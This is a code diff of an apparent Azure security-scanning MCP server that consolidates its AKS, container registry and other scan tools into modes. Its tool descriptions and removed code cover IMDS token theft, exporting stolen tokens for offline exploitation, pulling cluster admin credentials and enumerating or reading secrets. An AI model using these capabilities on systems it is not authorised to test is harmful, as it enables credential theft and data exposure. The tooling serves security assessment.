@@ -29,6 +29,8 @@ import { ComputeManagementClient } from "@azure/arm-compute";
 import { ContainerServiceClient } from "@azure/arm-containerservice";
 import { ContainerRegistryManagementClient } from "@azure/arm-containerregistry";
 import { BlobServiceClient } from "@azure/storage-blob";
+// Note: @azure/arm-appcontainers and @azure/arm-cdn may need to be installed
+// Fallback: Using REST API with credential.getToken() for Container Apps and CDN
 import * as azdev from "azure-devops-node-api";
 import PDFDocument from "pdfkit";
 import { marked } from "marked";
@@ -752,7 +754,7 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
       },
       {
         name: "azure_scan_acr_security",
-        description: "Azure Container Registry (ACR) security scanner. Checks: admin user enabled (high risk), public network access, vulnerability scanning enabled (Defender for Containers), content trust (image signing), network rules, anonymous pull access. Returns container security findings.",
+        description: "Comprehensive Azure Container Registry (ACR) security scanner. Checks: admin user enabled (high risk), public network access, vulnerability scanning (Defender for Containers), content trust (image signing), network rules, anonymous pull access, registry poisoning risks (vulnerable images, weak access policies, mutable tags).",
         inputSchema: {
           type: "object",
           properties: {
@@ -763,6 +765,15 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
             resourceGroup: {
               type: "string",
               description: "Optional: Filter by specific resource group",
+            },
+            registryName: {
+              type: "string",
+              description: "Optional: Specific ACR registry name to analyze",
+            },
+            scanMode: {
+              type: "string",
+              enum: ["security", "poisoning", "all"],
+              description: "Scan mode: 'security' (basic ACR config), 'poisoning' (supply chain risks), 'all' (comprehensive analysis)",
             },
             format: {
               type: "string",
@@ -822,39 +833,6 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
               type: "string",
               enum: ["markdown", "json"],
               description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
-            },
-          },
-          required: ["subscriptionId"],
-        },
-        annotations: {
-          readOnly: true,
-          destructive: false,
-          idempotent: false,
-          openWorld: true
-        }
-      },
-      {
-        name: "azure_scan_container_registry_poisoning",
-        description: "Scan ACR (Azure Container Registry) for poisoning risks: public registries, vulnerable images, missing signature verification, weak access policies, lack of scanning, and mutable tags. Checks admin account usage, content trust, network access, and Defender integration.",
-        inputSchema: {
-          type: "object",
-          properties: {
-            subscriptionId: {
-              type: "string",
-              description: "Azure subscription ID",
-            },
-            resourceGroup: {
-              type: "string",
-              description: "Optional: filter by resource group",
-            },
-            registryName: {
-              type: "string",
-              description: "Optional: specific ACR registry name to analyze",
-            },
-            format: {
-              type: "string",
-              description: "Output format: 'markdown' (default) or 'json'",
-              enum: ["markdown", "json"],
             },
           },
           required: ["subscriptionId"],
@@ -1228,7 +1206,7 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
       },
       {
         name: "azure_scan_aks_full",
-        description: "🚀 FULL AKS SECURITY SCAN - Runs ALL 7 AKS security checks in one shot: cluster security, credentials extraction, identity enumeration, node security, IMDS access testing, service account analysis, and secret hunting. Comprehensive Kubernetes security assessment.",
+        description: "🚀 COMPREHENSIVE AKS SECURITY SCAN - Flexible AKS security analysis with multiple scan modes: 'full' (all checks), 'live' (K8s API analysis), 'imds' (IMDS exploitation), 'pod_identity' (identity analysis), 'admission' (admission controller bypass). Covers cluster security, RBAC, secrets, service accounts, IMDS access, identity risks, and policy violations.",
         inputSchema: {
           type: "object",
           properties: {
@@ -1244,103 +1222,38 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
               type: "string",
               description: "AKS cluster name",
             },
-            format: {
+            scanMode: {
               type: "string",
-              enum: ["markdown", "json"],
-              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
-            },
-          },
-          required: ["subscriptionId", "resourceGroup", "clusterName"],
-        },
-        annotations: {
-          readOnly: true,
-          destructive: false,
-          idempotent: false,
-          openWorld: true
-        }
-      },
-      {
-        name: "azure_scan_aks_live",
-        description: "🔴 LIVE AKS SECURITY SCAN via Kubernetes API - Directly connects to cluster API server and performs real-time security analysis: enumerates secrets, service accounts, RBAC bindings, privileged pods, network policies, exposed services, and more. Requires cluster access.",
-        inputSchema: {
-          type: "object",
-          properties: {
-            subscriptionId: {
-              type: "string",
-              description: "Azure subscription ID",
-            },
-            resourceGroup: {
-              type: "string",
-              description: "Resource group containing the AKS cluster",
-            },
-            clusterName: {
-              type: "string",
-              description: "AKS cluster name",
+              enum: ["full", "live", "imds", "pod_identity", "admission"],
+              description: "Scan mode: 'full' (all security checks), 'live' (live K8s API scanning), 'imds' (IMDS exploitation), 'pod_identity' (Pod Identity/Workload Identity analysis), 'admission' (admission controller bypass detection)",
             },
             namespace: {
               type: "string",
-              description: "Specific namespace to scan (optional, scans all namespaces if not specified)",
-            },
-            format: {
-              type: "string",
-              enum: ["markdown", "json"],
-              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
-            },
-          },
-          required: ["subscriptionId", "resourceGroup", "clusterName"],
-        },
-        annotations: {
-          readOnly: true,
-          destructive: false,
-          idempotent: false,
-          openWorld: true
-        }
-      },
-      {
-        name: "azure_scan_aks_imds",
-        description: "IMDS exploitation and full reconnaissance - Complete attack chain: IMDS token theft, permission enumeration, resource discovery, data plane access testing. Tests Pod-to-IMDS-to-Azure attack path. Enumerates accessible subscriptions, resource groups, resources, role assignments, and tests data plane access (Storage, Key Vault, ACR). Supports token export for offline exploitation and cluster-wide IMDS exposure scanning.",
-        inputSchema: {
-          type: "object",
-          properties: {
-            subscriptionId: {
-              type: "string",
-              description: "Azure subscription ID",
-            },
-            resourceGroup: {
-              type: "string",
-              description: "Resource group containing the AKS cluster",
-            },
-            clusterName: {
-              type: "string",
-              description: "AKS cluster name",
-            },
-            namespace: {
-              type: "string",
-              description: "Target namespace to test IMDS from (default: uses first available pod)",
+              description: "Specific namespace to scan (for live/imds modes, scans all if not specified)",
             },
             podName: {
               type: "string",
-              description: "Specific pod to execute from (optional, auto-selects if not specified)",
+              description: "Specific pod to execute from (for imds mode, auto-selects if not specified)",
             },
             deepScan: {
               type: "boolean",
-              description: "Enable deep resource enumeration (slower but comprehensive). Default: true",
+              description: "Enable deep resource enumeration (for imds mode). Default: true",
             },
             testDataPlane: {
               type: "boolean",
-              description: "Test actual data plane access (Storage blobs, Key Vault secrets, ACR repos). Default: true",
+              description: "Test actual data plane access (for imds mode). Default: true",
             },
             exportTokens: {
               type: "boolean",
-              description: "Export stolen tokens to temp file with curl command examples for offline exploitation. Default: false",
+              description: "Export stolen tokens to temp file (for imds mode). Default: false",
             },
             deepDataPlane: {
               type: "boolean",
-              description: "Actually READ secret values, DOWNLOAD blob contents (not just enumerate). CAUTION: May expose sensitive data. Default: false",
+              description: "Actually READ secret values, DOWNLOAD blob contents (for imds mode). Default: false",
             },
             scanAllPods: {
               type: "boolean",
-              description: "Scan ALL pods cluster-wide for IMDS exposure (creates exposure heatmap). Slower but comprehensive assessment. Default: false",
+              description: "Scan ALL pods cluster-wide for IMDS exposure (for imds mode). Default: false",
             },
             format: {
               type: "string",
@@ -1357,9 +1270,10 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
           openWorld: true
         }
       },
+
       {
-        name: "azure_scan_aks_pod_identity",
-        description: "Scan AKS cluster for Pod Identity/Workload Identity token theft risks, overly permissive managed identities, service accounts with excessive RBAC, and Azure AD authentication issues",
+        name: "azure_scan_aks_policy_bypass",
+        description: "Detect Open Policy Agent (OPA) and Kyverno policy bypass vulnerabilities including constraint violations, policy exceptions abuse, and enforcement gaps. Analyzes Gatekeeper constraints, Kyverno policies, audit modes, and webhook configurations for security weaknesses.",
         inputSchema: {
           type: "object",
           properties: {
@@ -1377,8 +1291,8 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
             },
             format: {
               type: "string",
-              enum: ["markdown", "json"],
-              description: "Output format: 'markdown' (default) or 'json'",
+              enum: ["markdown", "json", "table"],
+              description: "Output format: 'markdown' (default), 'json', or 'table'",
             },
           },
           required: ["subscriptionId", "resourceGroup", "clusterName"],
@@ -1389,6 +1303,105 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
           idempotentHint: false,
           openWorldHint: true,
         },
+      },
+      {
+        name: "azure_scan_container_apps_security",
+        description: "Detect Azure Container Apps vulnerabilities including ingress exposure, secret management flaws, authentication bypass, environment variable leakage, Dapr misconfigurations, and scale rule exploits",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Optional: Filter by specific resource group",
+            },
+            containerAppName: {
+              type: "string",
+              description: "Optional: Target specific container app",
+            },
+            format: {
+              type: "string",
+              enum: ["markdown", "json", "table"],
+              description: "Output format: 'markdown' (default), 'json', or 'table'",
+            },
+          },
+          required: ["subscriptionId"],
+        },
+        annotations: {
+          readOnly: true,
+          destructive: false,
+          idempotent: false,
+          openWorld: true
+        }
+      },
+      {
+        name: "azure_scan_gitops_security",
+        description: "Detect Azure GitOps (Flux) vulnerabilities including source repository exposure, kustomization injection, Helm release manipulation, secret leakage, and Git credential exposure in AKS clusters",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Resource group containing the AKS cluster",
+            },
+            clusterName: {
+              type: "string",
+              description: "AKS cluster name to scan for GitOps configurations",
+            },
+            format: {
+              type: "string",
+              enum: ["markdown", "json", "table"],
+              description: "Output format: 'markdown' (default), 'json', or 'table'",
+            },
+          },
+          required: ["subscriptionId", "resourceGroup", "clusterName"],
+        },
+        annotations: {
+          readOnly: true,
+          destructive: false,
+          idempotent: false,
+          openWorld: true
+        }
+      },
+      {
+        name: "azure_scan_cdn_security",
+        description: "Detect Azure CDN and Front Door misconfigurations including origin exposure, caching exploits, WAF bypass, routing manipulation, custom domain validation bypass, and DDoS protection gaps",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Optional: Filter by specific resource group",
+            },
+            profileName: {
+              type: "string",
+              description: "Optional: Target specific CDN/Front Door profile",
+            },
+            format: {
+              type: "string",
+              enum: ["markdown", "json", "table"],
+              description: "Output format: 'markdown' (default), 'json', or 'table'",
+            },
+          },
+          required: ["subscriptionId"],
+        },
+        annotations: {
+          readOnly: true,
+          destructive: false,
+          idempotent: false,
+          openWorld: true
+        }
       },
     ],
   };
@@ -3305,11 +3318,23 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
       }
 
       case "azure_scan_acr_security": {
-        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
+        const { subscriptionId, resourceGroup, registryName, scanMode, format } = request.params.arguments as {
           subscriptionId: string;
           resourceGroup?: string;
+          registryName?: string;
+          scanMode?: string;
           format?: string;
         };
+
+        const mode = scanMode || "security";
+        
+        // If poisoning mode, use specialized function
+        if (mode === "poisoning") {
+          const result = await scanACRPoisoning(subscriptionId, resourceGroup, registryName, format);
+          return {
+            content: [{ type: "text", text: result }],
+          };
+        }
 
         const acrClient = new ContainerRegistryManagementClient(credential, subscriptionId);
         const registries: any[] = [];
@@ -3370,12 +3395,20 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         }
 
         registries.sort((a, b) => b.riskScore - a.riskScore);
+        
+        let output = `# Container Registry Security Analysis\n\n## Summary\n- Total ACRs: ${registries.length}\n- CRITICAL Risk: ${registries.filter(r => r.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${registries.filter(r => r.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${registries.filter(r => r.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(registries, null, 2)}`;
+        
+        // If 'all' mode, also include poisoning analysis
+        if (mode === "all") {
+          const poisoningResult = await scanACRPoisoning(subscriptionId, resourceGroup, registryName, format);
+          output += "\n\n" + poisoningResult;
+        }
 
         return {
           content: [
             {
               type: "text",
-              text: formatResponse(`# Container Registry Security Analysis\n\n## Summary\n- Total ACRs: ${registries.length}\n- CRITICAL Risk: ${registries.filter(r => r.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${registries.filter(r => r.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${registries.filter(r => r.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(registries, null, 2)}`, format, request.params.name),
+              text: formatResponse(output, format, request.params.name),
             },
           ],
         };
@@ -3455,24 +3488,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         };
       }
 
-      case "azure_scan_container_registry_poisoning": {
-        const { subscriptionId, resourceGroup, registryName, format } = request.params.arguments as {
-          subscriptionId: string;
-          resourceGroup?: string;
-          registryName?: string;
-          format?: string;
-        };
-
-        const result = await scanACRPoisoning(subscriptionId, resourceGroup, registryName, format);
-        return {
-          content: [
-            {
-              type: "text",
-              text: result,
-            },
-          ],
-        };
-      }
 
       case "azure_scan_storage_containers": {
         const { subscriptionId, resourceGroup, storageAccountName, maxBlobsPerContainer, format } = request.params.arguments as {
@@ -5084,14 +5099,55 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
       }
 
       case "azure_scan_aks_full": {
-        const { subscriptionId, resourceGroup, clusterName, format } = request.params.arguments as {
+        const args = request.params.arguments as {
           subscriptionId: string;
           resourceGroup: string;
           clusterName: string;
+          scanMode?: string;
+          namespace?: string;
+          podName?: string;
+          deepScan?: boolean;
+          testDataPlane?: boolean;
+          exportTokens?: boolean;
+          deepDataPlane?: boolean;
+          scanAllPods?: boolean;
           format?: string;
         };
 
+        // Validate scanMode
+        const validScanModes = ['full', 'live', 'imds', 'pod_identity', 'admission'];
+        const scanMode = args.scanMode || 'full';
+        if (!validScanModes.includes(scanMode)) {
+          return {
+            content: [{ type: 'text', text: `Invalid scanMode: ${scanMode}. Valid modes: ${validScanModes.join(', ')}` }],
+            isError: true,
+          };
+        }
+
+        const { subscriptionId, resourceGroup, clusterName, format, namespace, podName, deepScan, testDataPlane, exportTokens, deepDataPlane, scanAllPods } = args;
+
         try {
+          // Route to appropriate scan mode
+          if (scanMode !== 'full') {
+            return await scanAKSModeSpecific(
+              credential,
+              subscriptionId,
+              resourceGroup,
+              clusterName,
+              scanMode,
+              namespace,
+              podName,
+              deepScan,
+              testDataPlane,
+              exportTokens,
+              deepDataPlane,
+              scanAllPods,
+              format,
+              request.params.name
+            );
+          }
+
+          // Continue with full scan implementation below
           const aksClient = new ContainerServiceClient(credential, subscriptionId);
           const computeClient = new ComputeManagementClient(credential, subscriptionId);
           
@@ -5829,1324 +5885,14 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         }
       }
 
-      case "azure_scan_aks_live": {
-        const { subscriptionId, resourceGroup, clusterName, namespace, format } = request.params.arguments as {
-          subscriptionId: string;
-          resourceGroup: string;
-          clusterName: string;
-          namespace?: string;
-          format?: string;
-        };
-
-        try {
-          const aksClient = new ContainerServiceClient(credential, subscriptionId);
-          
-          let output = `# 🔴 LIVE AKS SECURITY SCAN via kubectl\n\n`;
-          output += `**Cluster:** ${clusterName}\n`;
-          output += `**Resource Group:** ${resourceGroup}\n`;
-          output += `**Subscription:** ${subscriptionId}\n`;
-          output += `**Target Namespace:** ${namespace || 'All namespaces'}\n`;
-          output += `**Scan Time:** ${new Date().toISOString()}\n`;
-          output += `**Scanner:** Stratos MCP v1.9.8 (20 Security Checks)\n\n`;
-          output += `---\n\n`;
-
-          output += `## 🔑 Connecting to Cluster...\n\n`;
-          
-          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
-          
-          let kubeconfig: string;
-          try {
-            const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
-            if (!adminCreds.kubeconfigs || adminCreds.kubeconfigs.length === 0) {
-              throw new Error("No kubeconfig returned");
-            }
-            kubeconfig = Buffer.from(adminCreds.kubeconfigs[0].value!).toString('utf-8');
-            output += `✅ Admin credentials obtained\n\n`;
-          } catch (adminError: any) {
-            // Try user credentials if admin fails (AAD-enabled clusters)
-            try {
-              const userCreds = await aksClient.managedClusters.listClusterUserCredentials(resourceGroup, clusterName);
-              if (!userCreds.kubeconfigs || userCreds.kubeconfigs.length === 0) {
-                throw new Error("No kubeconfig returned");
-              }
-              kubeconfig = Buffer.from(userCreds.kubeconfigs[0].value!).toString('utf-8');
-              output += `✅ User credentials obtained (admin credentials unavailable)\n\n`;
-            } catch (userError: any) {
-              return {
-                content: [{
-                  type: 'text',
-                  text: `# ❌ Failed to Connect to Cluster\n\n` +
-                    `Could not obtain cluster credentials.\n\n` +
-                    `**Admin Error:** ${adminError.message}\n` +
-                    `**User Error:** ${userError.message}\n\n` +
-                    `**Try manually:**\n` +
-                    `\`\`\`bash\n` +
-                    `az aks get-credentials --resource-group ${resourceGroup} --name ${clusterName}\n` +
-                    `kubectl get nodes\n` +
-                    `\`\`\``
-                }],
-                isError: true,
-              };
-            }
-          }
-
-          // Convert kubeconfig from devicecode to azurecli auth
-          // Replace: --login devicecode → --login azurecli
-          kubeconfig = kubeconfig.replace(/--login\s+devicecode/gi, '--login azurecli');
-          
-          // Save kubeconfig to temp file for kubectl fallback
-          const os = await import('os');
-          const path = await import('path');
-          const fs = await import('fs').then(m => m.promises);
-          const tempKubeconfig = path.join(os.tmpdir(), `stratos-kubeconfig-${Date.now()}.yaml`);
-          await fs.writeFile(tempKubeconfig, kubeconfig);
-          
-          // Validate Azure CLI session and token before running kubectl
-          output += `**Validating Azure CLI session...**\n`;
-          try {
-            const { exec } = await import('child_process');
-            // First check if account is configured
-            await new Promise<void>((resolve, reject) => {
-              exec('az account show', { timeout: 5000 }, (error, stdout, stderr) => {
-                if (error) {
-                  reject(new Error('Azure CLI not authenticated'));
-                } else {
-                  resolve();
-                }
-              });
-            });
-            
-            // Then validate token is still valid by attempting to get access token
-            await new Promise<void>((resolve, reject) => {
-              exec('az account get-access-token --resource https://management.azure.com/', { timeout: 10000 }, (error, stdout, stderr) => {
-                if (error) {
-                  // Check if it's a token expiration issue
-                  if (stderr.includes('expired') || stderr.includes('refresh') || stderr.includes('AADSTS')) {
-                    reject(new Error('Azure CLI token expired - please run: az login'));
-                  } else {
-                    reject(new Error('Azure CLI token validation failed'));
-                  }
-                } else {
-                  try {
-                    const tokenData = JSON.parse(stdout);
-                    if (!tokenData.accessToken) {
-                      reject(new Error('No valid access token available'));
-                    } else {
-                      resolve();
-                    }
-                  } catch (e) {
-                    reject(new Error('Invalid token response'));
-                  }
-                }
-              });
-            });
-            output += `✅ Azure CLI session and token valid\n\n`;
-          } catch (azError: any) {
-            try { await fs.unlink(tempKubeconfig); } catch (e) {}
-            return {
-              content: [{
-                type: 'text',
-                text: `# ❌ Azure CLI Authentication Required\n\n` +
-                  `The Azure CLI session has expired or token is invalid.\n\n` +
-                  `**Error:** ${azError.message}\n\n` +
-                  `## 🔧 Fix\n\n` +
-                  `Run the following command to re-authenticate:\n\n` +
-                  `\`\`\`bash\n` +
-                  `az login\n` +
-                  `\`\`\`\n\n` +
-                  `**Common Causes:**\n` +
-                  `- Token expired (Azure CLI tokens expire after some time)\n` +
-                  `- Session not refreshed (run \`az login\` periodically)\n` +
-                  `- Multi-tenant issues (use \`az login --tenant <tenant-id>\`)\n\n` +
-                  `Then try the scan again.\n\n` +
-                  `**Note:** This tool requires valid Azure CLI authentication for kubectl operations.`
-              }],
-              isError: true,
-            };
-          }
-          
-          // Timeout constant for kubectl calls (30 seconds)
-          const KUBECTL_TIMEOUT_MS = 30000;
-          
-          // Helper function to run kubectl command (primary method - more reliable)
-          const runKubectl = async (args: string): Promise<string> => {
-            const { exec, spawn } = await import('child_process');
-            return new Promise((resolve, reject) => {
-              let killed = false;
-              const child = exec(
-                `kubectl --kubeconfig="${tempKubeconfig}" ${args}`,
-                { maxBuffer: 10 * 1024 * 1024, timeout: KUBECTL_TIMEOUT_MS },
-                (error, stdout, stderr) => {
-                  if (killed) return;
-                  if (error) {
-                    if (error.killed || error.signal === 'SIGTERM') {
-                      reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
-                    } else {
-                      // Check for authentication-related errors
-                      const errorMsg = (stderr || error.message).toLowerCase();
-                      if (errorMsg.includes('unauthorized') || errorMsg.includes('authentication') || 
-                          errorMsg.includes('token') || errorMsg.includes('expired') ||
-                          errorMsg.includes('aadsts') || errorMsg.includes('credentials')) {
-                        reject(new Error(`Authentication failed - Azure CLI token may have expired. Run 'az login' and retry. Details: ${stderr || error.message}`));
-                      } else {
-                        reject(new Error(stderr || error.message));
-                      }
-                    }
-                  } else {
-                    resolve(stdout);
-                  }
-                }
-              );
-              
-              // Backup timeout to kill process
-              setTimeout(() => {
-                if (child.exitCode === null) {
-                  killed = true;
-                  child.kill('SIGTERM');
-                  reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
-                }
-              }, KUBECTL_TIMEOUT_MS + 1000);
-            });
-          };
-          
-          let criticalCount = 0;
-          let highCount = 0;
-          let mediumCount = 0;
-          let lowCount = 0;
-          const findings: Array<{severity: string; category: string; finding: string; details: string}> = [];
-
-          // ========== 1. ENUMERATE NAMESPACES ==========
-          output += `## 📁 Namespaces\n\n`;
-          let nsList: string[] = [];
-          try {
-            const nsJson = await runKubectl('get namespaces -o json');
-            const nsData = JSON.parse(nsJson);
-            nsList = (nsData.items || []).map((ns: any) => ns.metadata?.name).filter(Boolean);
-            output += `Found **${nsList.length}** namespaces:\n`;
-            output += `\`${nsList.join(', ')}\`\n\n`;
-          } catch (e: any) {
-            output += `❌ Failed to list namespaces: ${e.message}\n\n`;
-          }
-
-          // ========== 2. ENUMERATE SECRETS ==========
-          output += `## 🔐 Secrets Analysis\n\n`;
-          try {
-            const secretsCmd = namespace 
-              ? `get secrets -n ${namespace} -o json`
-              : `get secrets --all-namespaces -o json`;
-            const secretsJson = await runKubectl(secretsCmd);
-            const allSecrets = JSON.parse(secretsJson).items || [];
-            
-            const nonSaSecrets = allSecrets.filter((s: any) => s.type !== 'kubernetes.io/service-account-token');
-            const sensitiveSecrets: Array<{ns: string; name: string; type: string; keys: string[]}> = [];
-            
-            const sensitiveKeywords = ['password', 'secret', 'key', 'token', 'connection', 'azure', 'credential', 'api'];
-            
-            for (const secret of nonSaSecrets) {
-              const keys = Object.keys((secret as any).data || {});
-              const hasSensitive = keys.some((k: string) => 
-                sensitiveKeywords.some(kw => k.toLowerCase().includes(kw))
-              );
-              if (hasSensitive || (secret as any).type === 'Opaque') {
-                sensitiveSecrets.push({
-                  ns: (secret as any).metadata?.namespace || 'unknown',
-                  name: (secret as any).metadata?.name || 'unknown',
-                  type: (secret as any).type || 'unknown',
-                  keys: keys
-                });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Secrets | ${allSecrets.length} |\n`;
-            output += `| Service Account Tokens | ${allSecrets.length - nonSaSecrets.length} |\n`;
-            output += `| Application Secrets | ${nonSaSecrets.length} |\n`;
-            output += `| Potentially Sensitive | ${sensitiveSecrets.length} |\n\n`;
-            
-            if (sensitiveSecrets.length > 0) {
-              output += `### 🎯 Potentially Sensitive Secrets\n\n`;
-              output += `| Namespace | Secret Name | Type | Keys |\n|-----------|-------------|------|------|\n`;
-              for (const s of sensitiveSecrets.slice(0, 20)) {
-                output += `| ${s.ns} | ${s.name} | ${s.type} | ${s.keys.slice(0, 3).join(', ')}${s.keys.length > 3 ? '...' : ''} |\n`;
-              }
-              if (sensitiveSecrets.length > 20) {
-                output += `\n*...and ${sensitiveSecrets.length - 20} more*\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'Secrets',
-                finding: `${sensitiveSecrets.length} potentially sensitive secrets found`,
-                details: 'Review secrets for hardcoded credentials'
-              });
-              highCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to list secrets: ${e.message}\n\n`;
-          }
-
-          // ========== 3. SERVICE ACCOUNTS ==========
-          output += `## 👤 Service Accounts\n\n`;
-          try {
-            const saCmd = namespace 
-              ? `get serviceaccounts -n ${namespace} -o json`
-              : `get serviceaccounts --all-namespaces -o json`;
-            const saJson = await runKubectl(saCmd);
-            const saList = JSON.parse(saJson).items || [];
-            
-            const defaultSaAutoMount: Array<{ns: string; name: string}> = [];
-            
-            for (const sa of saList) {
-              if ((sa as any).automountServiceAccountToken !== false) {
-                if ((sa as any).metadata?.name === 'default') {
-                  defaultSaAutoMount.push({
-                    ns: (sa as any).metadata?.namespace || 'unknown',
-                    name: (sa as any).metadata?.name || 'unknown'
-                  });
-                }
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Service Accounts | ${saList.length} |\n`;
-            output += `| Default SAs with Auto-Mount | ${defaultSaAutoMount.length} |\n\n`;
-            
-            if (defaultSaAutoMount.length > 0) {
-              output += `### ⚠️ Default Service Accounts with Token Auto-Mount\n\n`;
-              for (const sa of defaultSaAutoMount.slice(0, 10)) {
-                output += `- \`${sa.ns}/default\`\n`;
-              }
-              output += '\n';
-              
-              findings.push({
-                severity: 'MEDIUM',
-                category: 'Service Accounts',
-                finding: `${defaultSaAutoMount.length} default SAs with auto-mount enabled`,
-                details: 'Disable automountServiceAccountToken on default SAs'
-              });
-              mediumCount++;
-            }
-          } catch (e: any) {
-            output += `❌ Failed to list service accounts: ${e.message}\n\n`;
-          }
-
-          // ========== 4. RBAC BINDINGS ==========
-          output += `## 🔒 RBAC Analysis\n\n`;
-          try {
-            const crbJson = await runKubectl('get clusterrolebindings -o json');
-            const crbItems = JSON.parse(crbJson).items || [];
-            
-            const rbCmd = namespace 
-              ? `get rolebindings -n ${namespace} -o json`
-              : `get rolebindings --all-namespaces -o json`;
-            const rbJson = await runKubectl(rbCmd);
-            const rbItems = JSON.parse(rbJson).items || [];
-            
-            const dangerousBindings: Array<{name: string; role: string; subjects: string[]}> = [];
-            const dangerousRoles = ['cluster-admin', 'admin', 'edit'];
-            
-            for (const crb of crbItems) {
-              if (dangerousRoles.includes((crb as any).roleRef?.name)) {
-                const subjects = ((crb as any).subjects || []).map((s: any) => 
-                  `${s.kind}:${s.namespace ? s.namespace + '/' : ''}${s.name}`
-                );
-                dangerousBindings.push({
-                  name: (crb as any).metadata?.name || 'unknown',
-                  role: (crb as any).roleRef?.name,
-                  subjects: subjects
-                });
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Cluster Role Bindings | ${crbItems.length} |\n`;
-            output += `| Role Bindings | ${rbItems.length} |\n`;
-            output += `| Dangerous Cluster Bindings | ${dangerousBindings.length} |\n\n`;
-            
-            if (dangerousBindings.length > 0) {
-              output += `### 🚨 High-Privilege Cluster Role Bindings\n\n`;
-              output += `| Binding Name | Role | Subjects |\n|--------------|------|----------|\n`;
-              for (const b of dangerousBindings.slice(0, 15)) {
-                output += `| ${b.name} | ${b.role} | ${b.subjects.slice(0, 2).join(', ')}${b.subjects.length > 2 ? '...' : ''} |\n`;
-              }
-              output += '\n';
-              
-              const clusterAdminCount = dangerousBindings.filter(b => b.role === 'cluster-admin').length;
-              if (clusterAdminCount > 5) {
-                findings.push({
-                  severity: 'HIGH',
-                  category: 'RBAC',
-                  finding: `${clusterAdminCount} cluster-admin bindings found`,
-                  details: 'Excessive cluster-admin bindings - review and reduce'
-                });
-                highCount++;
-              }
-            }
-          } catch (e: any) {
-            output += `❌ Failed to analyze RBAC: ${e.message}\n\n`;
-          }
-
-          // ========== 5. PRIVILEGED PODS ==========
-          output += `## 🐳 Pod Security Analysis\n\n`;
-          try {
-            const podsCmd = namespace
-              ? `get pods -n ${namespace} -o json`
-              : `get pods --all-namespaces -o json`;
-            const podsJson = await runKubectl(podsCmd);
-            const podItems = JSON.parse(podsJson).items || [];
-            
-            const privilegedPods: Array<{ns: string; name: string; container: string; issues: string[]}> = [];
-            const hostNetworkPods: Array<{ns: string; name: string}> = [];
-            const hostPathPods: Array<{ns: string; name: string; paths: string[]}> = [];
-            
-            for (const pod of podItems) {
-              const podName = (pod as any).metadata?.name || 'unknown';
-              const podNs = (pod as any).metadata?.namespace || 'unknown';
-              
-              if ((pod as any).spec?.hostNetwork) {
-                hostNetworkPods.push({ ns: podNs, name: podName });
-              }
-              
-              const hostPaths = ((pod as any).spec?.volumes || [])
-                .filter((v: any) => v.hostPath)
-                .map((v: any) => v.hostPath?.path || 'unknown');
-              if (hostPaths.length > 0) {
-                hostPathPods.push({ ns: podNs, name: podName, paths: hostPaths });
-              }
-              
-              for (const container of ((pod as any).spec?.containers || [])) {
-                const sc = container.securityContext;
-                const issues: string[] = [];
-                
-                if (sc?.privileged) issues.push('privileged');
-                if (sc?.allowPrivilegeEscalation !== false) issues.push('allowPrivilegeEscalation');
-                if (sc?.runAsUser === 0) issues.push('runAsRoot');
-                if (sc?.capabilities?.add?.includes('SYS_ADMIN')) issues.push('CAP_SYS_ADMIN');
-                
-                if (issues.length > 0 && issues.includes('privileged')) {
-                  privilegedPods.push({
-                    ns: podNs,
-                    name: podName,
-                    container: container.name,
-                    issues: issues
-                  });
-                }
-              }
-            }
-            
-            output += `| Metric | Count |\n|--------|-------|\n`;
-            output += `| Total Pods | ${podItems.length} |\n`;
-            output += `| Privileged Containers | ${privilegedPods.length} |\n`;
-            output += `| Host Network Pods | ${hostNetworkPods.length} |\n`;
-            output += `| Host Path Mounts | ${hostPathPods.length} |\n\n`;
-            
-            if (privilegedPods.length > 0) {
-              output += `### 🚨 Privileged Containers\n\n`;
-              output += `| Namespace | Pod | Container | Issues |\n|-----------|-----|-----------|--------|\n`;
-              for (const p of privilegedPods.slice(0, 10)) {
